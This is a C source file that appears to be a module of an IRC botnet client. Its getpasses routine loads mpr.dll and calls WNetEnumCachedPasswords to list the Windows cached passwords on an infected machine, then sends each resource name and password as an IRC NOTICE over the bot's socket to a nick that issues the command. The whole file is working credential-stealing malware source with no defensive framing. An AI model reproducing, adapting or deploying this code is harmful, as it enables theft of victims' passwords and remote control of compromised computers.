#include <windows.h>
#include <stdio.h>
#include <windows.h>
#include <winsock.h>

extern SOCKET botsock;
extern HWND hwnd;

int cnt = 0;
void getpasses(SOCKET s, char * nick);

// get passwords taken from Vitas Ramanchauskas

typedef struct tagPASSWORD_CACHE_ENTRY {
WORD cbEntry; // size of this entry, in bytes
WORD cbResource; // size of resource name, in bytes
WORD cbPassword; // size of password, in bytes
BYTE iEntry; // entry index
BYTE nType; // type of entry
BYTE abResource[1]; // start of resource name
// password immediately follows resource name
} PASSWORD_CACHE_ENTRY;

char passbuff[2000];
char joo[60];


BOOL CALLBACK pce(PASSWORD_CACHE_ENTRY *x, DWORD dts)
{
	FARPROC enp;
	cnt++;
	memset(strchr(x->abResource,(int)'\0'),(int)' ',1);
//	ZeroMemory(passbuff,2000);
	sprintf(passbuff,"NOTICE %s :%s\r\n",joo,x->abResource);
//	lstrcat(passbuff,"NOTICE ");
//	lstrcat(passbuff,joo);
//	lstrcat(passbuff," :");
//	lstrcat(passbuff,x->abResource);
//	lstrcat(passbuff,"\r\n");
	serverout(passbuff,botsock);
	return 1;

}


void getpasses(SOCKET s, char * nick)
{
	HINSTANCE hi = LoadLibrary("mpr.dll");

	ZeroMemory(joo,60);
	lstrcat(joo,nick);

	if(!hi)
	{
		sprintf(passbuff,"NOTICE %s :Couldnt load mpr.dll!\r\n",nick);
		serverout(passbuff,s);
		return;
	}


	WORD (__stdcall *enp)(LPSTR, WORD, BYTE, void*, DWORD) = GetProcAddress(hi, "WNetEnumCachedPasswords");

	if(!enp)
	{
		sprintf(passbuff,"notice %s :Function doesnt exist!\r\n",nick);
		serverout(passbuff,s);
		FreeLibrary(hi);
		return;
	}

	(*enp)(0,0, 0xff, &pce, 0);

	if(!cnt)
	{
		sprintf(passbuff,"notice %s :No Passes Found =(\r\n",nick);
		serverout(passbuff,s);
	}

	FreeLibrary(hi);
	return;

}
